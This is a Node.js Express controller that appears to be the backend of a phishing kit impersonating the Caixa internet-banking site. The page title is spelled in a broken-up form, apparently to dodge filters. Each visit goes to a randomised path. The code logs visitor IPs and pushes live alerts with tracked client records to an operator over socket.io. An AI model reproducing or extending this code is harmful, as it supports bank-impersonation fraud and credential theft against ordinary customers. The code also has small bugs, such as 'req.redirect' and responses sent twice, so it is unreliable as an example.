const userByToken = require('../../middlewares/auth')
const User = require('../../models/User_bk')
const Product = require('../../models/Product')
const Client = require('../../models/Client')
const Count = require('../../models/Count')
const Crypto = require('crypto')
const { random } = require('faker')

function hashCode(str) {
    return str.split('').reduce((prevHash, currVal) =>
      (((prevHash << 5) - prevHash) + currVal.charCodeAt(0))|0, 0);
  }

module.exports = {
    async view(req, res) {
        try {
            //const ipClient = socket.request.connection._peername


            const number = Math.floor(Math.random() * 65536)
            const number2 = hashCode(`secret hash where ${number}`)

            const { acess } = req.params
            
            const { client } = req.query


            if(!acess) {

                if(client) res.redirect(`/proc/${number}?id=${number2}&client=${client}`)
                else return res.redirect(`/proc/${number}?id=${number2}`)
            }
            

            let hasUpdate


            if(client) {
                const theClient = await Client.findByPk(client)

                if(theClient) {

                    hasUpdate = theClient.id
                    setTimeout(() => {
                        req.app.io.emit('inUser', theClient.toJSON())

                    }, 500)
                }else{
                    res.redirect('/')
                }
            }
    
            const ipConverted = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim()
    
            const countClient = await Count.findOne({ where: {
                ip: ipConverted
            }})
    
            if(!countClient) {
                await Count.create({
                    value: 1,
                    ip: ipConverted
                })
            }
    
            const countsExist = await Count.count()
    
            req.app.io.emit('countVisitors', countsExist)

            return res.render('index', { title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA', pageClasses: 'cadastro', hasUpdate })
        } catch (error) {
            console.log(error)
            return res.redirect('/login')
        }
    },
    async pageRandom(req, res) {
        try {
            //const ipClient = socket.request.connection._peername


            const number = Math.floor(Math.random() * 65536)

            const { acess } = req.params

            //console.log(`number aqui: `, number);

            if(!acess) return req.redirect(`/proc/${number}`)

            const { client } = req.query

            let hasUpdate

            if(client) {
                const theClient = await Client.findByPk(client)

                if(theClient) {

                    hasUpdate = theClient.id
                    setTimeout(() => {
                        req.app.io.emit('inUser', theClient.toJSON())

                    }, 500)
                }else{
                    res.redirect('/')
                }
            }
    
            const ipConverted = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim()
    
            const countClient = await Count.findOne({ where: {
                ip: ipConverted
            }})
    
            if(!countClient) {
                await Count.create({
                    value: 1,
                    ip: ipConverted
                })
            }
    
            const countsExist = await Count.count()
    
            req.app.io.emit('countVisitors', countsExist)

            return res.render('index', { title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA', pageClasses: 'cadastro', hasUpdate })
        } catch (error) {
            console.log(error)
            return res.redirect('/login')
        }
    },
}
